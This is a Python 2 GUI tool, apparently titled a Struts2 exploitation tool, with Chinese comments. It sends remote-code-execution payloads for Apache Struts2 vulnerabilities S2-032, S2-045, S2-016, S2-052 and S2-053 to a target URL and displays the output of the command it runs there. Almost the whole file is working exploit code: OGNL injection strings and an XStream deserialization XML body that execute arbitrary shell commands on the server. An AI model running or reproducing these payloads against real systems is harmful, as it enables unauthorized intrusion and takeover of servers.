# -*- coding: utf-8 -*-
# coded by Deen

import requests
import urllib2
import httplib
import re
from urllib import urlencode
from Tkinter import *


class App:

    # 进行GUI设计
    def __init__(self, master):
        frame = Frame(master)
        # 主窗口里面再创建一个frame
        self.fm_1 = Frame(frame)
        self.fm_1.pack()

        # 设置一个label
        l1 = Label(self.fm_1, text="url：").grid(row=0, column=0)
        l2 = Label(self.fm_1, text="cmd：").grid(row=1, column=0)
        l3 = Label(self.fm_1, text="parameter：").grid(row=2, column=0)

        # 设置一个url输入框
        s1 = StringVar()
        self.e1 = Entry(self.fm_1,
                        borderwidth=3,
                        textvariable=s1,
                        relief=RIDGE,
                        bd=7,
                        width=33,
                        font=5,
                        justify=LEFT)
        self.e1.grid(row=0, column=1, columnspan=4, sticky=N + S)
        #s1.set("Input url here ")

        # 添加一个命令输入框
        s2 = StringVar()
        self.e2 = Entry(self.fm_1,
                        borderwidth=3,
                        textvariable=s2,
                        relief=RIDGE,
                        bd=10,
                        width=33,
                        font=5,
                        justify=LEFT)
        self.e2.grid(row=1, column=1, columnspan=3, sticky=N + S)
        #s2.set("Input cmd here ")

        # 添加参数输入框，添加提交数据请求方法选择框
        s3 = StringVar()
        self.e3 = Entry(self.fm_1,
                        borderwidth=3,
                        textvariable=s3,
                        relief=RIDGE,
                        bd=7,
                        width=33,
                        font=5,
                        justify=LEFT)
        self.e3.grid(row=2, column=1, columnspan=3, sticky=N + S)

        # 添加一个文本框，作为函数运行的输出
        # 添加一个self可以在其他定义的函数进行调用
        #self.text = Text(self.fm_1)
        #self.text.grid(row=3, column=0, columnspan=4, sticky=N + S)

        # 给两个输入框添加清空按钮
        # 清空url输入
        b3 = Button(self.fm_1,
                    text="清空",
                    command=self.clearUrl,
                    bg='gray').grid(row=0,
                                    column=5)

        # 清空命令执行输入
        b4 = Button(self.fm_1,
                    text="清空",
                    command=self.clearCmd,
                    bg='gray').grid(row=1,
                                    column=5)

        # 清空参数输入
        b5 = Button(self.fm_1,
                    text="清空",
                    command=self.clearParameter,
                    bg='gray').grid(row=2,
                                    column=5)

        # 添加一个命令执行按钮
        b1 = Button(self.fm_1,
                    text="命令执行",
                    command=self.cmd,
                    fg='red').grid(row=3,
                                   column=2)
        # 添加一个清空按钮
        b2 = Button(self.fm_1,
                    text="清空",
                    command=self.clearText,
                    bg='gray').grid(row=3,
                                    column=3)

        # 为了美观再建一个frame
        self.fm_2 = Frame(frame)
        self.fm_2.pack()

        # 添加Radiobutton控件，进行漏洞选择
        self.v = StringVar()
        # 提交方法
        self.v2 = StringVar()

        r1 = Radiobutton(self.fm_2,
                         text="st-032",
                         variable=self.v,
                         value='032')
        r1.grid(row=2, column=0)

        r2 = Radiobutton(self.fm_2,
                         text="st-045",
                         variable=self.v,
                         value='045')
        r2.grid(row=2, column=1)

        r3 = Radiobutton(self.fm_2,
                         text="st-016",
                         variable=self.v,
                         value='016')
        r3.grid(row=2, column=2)

        r4 = Radiobutton(self.fm_2,
                         text="st-052",
                         variable=self.v,
                         value='052')
        r4.grid(row=2, column=3)

        r5 = Radiobutton(self.fm_2,
                         text="st-053",
                         variable=self.v,
                         value='053')
        r5.grid(row=2, column=4)

        # 添加数据请求方法选择
        r6 = Radiobutton(self.fm_1, text="GET", variable=self.v2, value='GET')
        r6.grid(row=3, column=0)

        r7 = Radiobutton(self.fm_1,
                         text="POST",
                         variable=self.v2,
                         value='POST')
        r7.grid(row=3, column=1)

        # 添加一个text进行结果输出
        self.text = Text(self.fm_2)
        self.text.grid(row=3, column=0, columnspan=5, sticky=N + S)

        frame.pack()

    def clearText(self):
        self.text.delete(0.0, END)

    def clearUrl(self):
        self.e1.delete(0, END)

    def clearCmd(self):
        self.e2.delete(0, END)

    def clearParameter(self):
        self.e3.delete(0, END)

    def cmd(self):
        #提高代码复用
        v = self.v.get()
        #方法获取
        v2 = self.v2.get()

        # 获取参数以及参数的值
        parms = self.e3.get()

        url = self.e1.get()
        cmd = self.e2.get()
        self.text.insert(INSERT, "[*] Apache Structs2 S2-%s\n" % (v))
        self.text.insert(INSERT, "[*] cmd: " + cmd + "\n")
        # if语句进行判断，直接在本函数下进行处理和攻击
        if v == '032':
            # 对url进行处理，拼接payload
            url_patterns = url.split("action")
            url = url_patterns[
                0
            ] + "action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=" + cmd + "&pp=\\\\A&ppp=%20&encoding=UTF-8"
            response = requests.get(url)
            result = response.text
            self.text.insert(INSERT, '\n' + result + '\n')

        if v == '045':
            # 构造payload
            payload = "%{(#_='multipart/form-data')."
            payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            payload += "(#_memberAccess?"
            payload += "(#_memberAccess=#dm):"
            payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            payload += "(#ognlUtil.getExcludedPackageNames().clear())."
            payload += "(#ognlUtil.getExcludedClasses().clear())."
            payload += "(#context.setMemberAccess(#dm))))."
            payload += "(#cmd='%s')." % (cmd)
            payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
            payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            payload += "(#ros.flush())}"
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            try:
                response = urllib2.Request(url, headers=headers)
                result = urllib2.urlopen(response).read()
            except httplib.IncompleteRead, e:
                result = e.partial
            self.text.insert(INSERT, '\n' + result + '\n')

        if v == '016':
            url_patterns = url.split("action")
            url = url_patterns[
                0
            ] + "action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + cmd + "%27%29.getInputStream%28%29%29%7D"
            response = requests.get(url)
            result = response.text
            # 利用正则对返回结果进行处理
            pattern = re.compile('name\s\[(.*?)\]')
            results = pattern.findall(result)
            self.text.insert(INSERT, '\n' + results[0] + '\n')

        if v == '052':
            # 读命令进行分解
            cmd_patterns = cmd.split()
            #print cmd_patterns
            length = len(cmd_patterns)
            payload = ''
            for i in cmd_patterns:
                payload += '<string>' + str(i) + '</string>'

            headers = {
                'User-Agent':
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Accept':
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/xml'
            }
            data = """<map>
<entry>
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command>%s</command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>""" % (payload)
            #print data
            response = requests.post(url, data=data, headers=headers)
            result = response.text
            self.text.insert(INSERT, '\n' + result + '\n')

        if v == '053':
            payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            params = urlencode({parms: payload})
            if v2 == 'GET':
                full_url = url + '/?' + params
                print full_url
                response = requests.get(full_url)
                result = response.text
                self.text.insert(INSERT, '\n' + result + '\n')
            else:
                pass


if __name__ == '__main__':
    root = Tk()

    # 设置窗体名称
    root.title("struts2-利用工具-by Deen")
    root.configure(background='black')
    #root.maxsize(550,450)
    #root.minsize(550,450)
    # 设置窗体大小
    #root.geometry('700x300')

    app = App(root)
    root.mainloop()
    root.destroy()
